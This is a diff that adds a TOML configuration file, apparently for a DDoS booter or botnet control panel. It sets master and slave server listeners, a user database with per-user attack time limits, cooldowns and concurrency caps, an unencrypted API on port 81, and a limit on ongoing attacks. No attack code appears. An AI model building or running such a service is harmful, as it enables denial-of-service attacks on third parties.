@@ -1,0 +1,33 @@
+[templates]
+
+# Manage the master servers config
+[templates.server]
+protocol = "tcp"
+listener = ":666"
+
+# Manage the slave servers config
+[templates.slaves]
+protocol = "tcp"
+listener = ":1995"
+
+# Manage the SQL location for the database
+[templates.database]
+local = "./assets/data.sql"
+
+# Manage the default for when a user is created
+[templates.database.defaults]
+maxtime = 120
+admin = false
+api = false
+cooldown = 60
+max_daily = 100
+concurrents = 1
+
+[templates.api]
+listener = "0.0.0.0:81"
+tls = false
+key = "templates/api.key"
+cert = "templates/api.cert"
+
+[templates.attacks]
+maximum_ongoing = 1
